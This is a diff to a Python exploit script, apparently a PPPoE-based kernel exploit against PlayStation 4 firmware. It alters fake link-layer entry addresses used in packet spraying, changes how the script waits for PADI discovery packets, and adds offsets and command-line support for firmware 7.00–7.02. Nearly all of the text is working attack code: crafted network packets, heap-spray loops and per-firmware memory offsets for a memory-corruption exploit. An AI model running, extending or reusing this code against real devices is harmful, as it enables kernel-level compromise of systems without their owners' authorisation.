@@ -165,7 +165,7 @@ class Exploit():
 
     SOURCE_MAC = '41:41:41:41:41:41'
     SOURCE_IPV4 = '41.41.41.41'
-    SOURCE_IPV6 = 'fe80::4141:4141:4141:4141'
+    SOURCE_IPV6 = 'fe80::9f9f:41ff:9f9f:41ff'
 
     TARGET_IPV4 = '42.42.42.42'
 
@@ -259,17 +259,18 @@ class Exploit():
                              id=pkt[PPP_IPCP].id,
                              options=pkt[PPP_IPCP].options))
 
-    def ppp_negotation(self, cb=None, ignore_initial_reqs=False):
-        num_reqs_to_ignore = 6  # Ignore initial requests in order to increase the chances of the exploit to work
-                                # Tested from 6 to 8 requests, on version 10.50 - all give best results then not ignoring
-        num_ignored_reqs = 0
+    def ppp_negotation(self, cb=None, ignore_initial_req=False):
+        if ignore_initial_req:
+            print('[*] Waiting for PADI...')
+            while True:
+                pkt = self.s.recv()
+                if pkt and pkt.haslayer(
+                        PPPoED) and pkt[PPPoED].code == PPPOE_CODE_PADI:
+                    break
+
         print('[*] Waiting for PADI...')
         while True:
             pkt = self.s.recv()
-            if ignore_initial_reqs and (num_ignored_reqs < num_reqs_to_ignore):
-                print('[*] Ignoring initial PS4 PPoE request #{}..'.format(num_ignored_reqs+1))
-                num_ignored_reqs+=1
-                continue
             if pkt and pkt.haslayer(
                     PPPoED) and pkt[PPPoED].code == PPPOE_CODE_PADI:
                 break
@@ -457,7 +458,7 @@ class Exploit():
         fake_lle += p32(0)  # sin6_flowinfo
         # sin6_addr
         fake_lle += p64be(0xfe80000100000000)
-        fake_lle += p64be(0x4141414141414141)
+        fake_lle += p64be(0x9f9f41ff9f9f41ff)
         fake_lle += p32(0)  # sin6_scope_id
 
         # pad
@@ -636,7 +637,7 @@ class Exploit():
                       end='\r',
                       flush=True)
 
-            source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
+            source_ipv6 = 'fe80::{:04x}:41ff:9f9f:41ff'.format(i)
 
             self.s.send(
                 Ether(src=self.source_mac, dst=self.target_mac) /
@@ -719,7 +720,7 @@ class Exploit():
             if i >= self.HOLE_START and i % self.HOLE_SPACE == 0:
                 continue
 
-            source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
+            source_ipv6 = 'fe80::{:04x}:41ff:9f9f:41ff'.format(i)
 
             self.s.send(
                 Ether(src=self.source_mac, dst=self.target_mac) /
@@ -827,7 +828,7 @@ def main():
     parser.add_argument('--interface', required=True)
     parser.add_argument('--fw',
                         choices=[
-                            '750', '751', '755',
+                            '700','701','702','750', '751', '755',
                             '800', '801', '803', '850', '852',
                             '900', '903', '904', '950', '951', '960',
                             '1000', '1001', '1050', '1070', '1071',
@@ -847,7 +848,9 @@ def main():
     with open(args.stage2, mode='rb') as f:
         stage2 = f.read()
 
-    if args.fw in ('750', '751', '755'):
+    if args.fw in ('700', '701', '702'):
+        offs = OffsetsFirmware_700_702()
+    elif args.fw in ('750', '751', '755'):
         offs = OffsetsFirmware_750_755()
     elif args.fw in ('800', '801', '803'):
         offs = OffsetsFirmware_800_803()
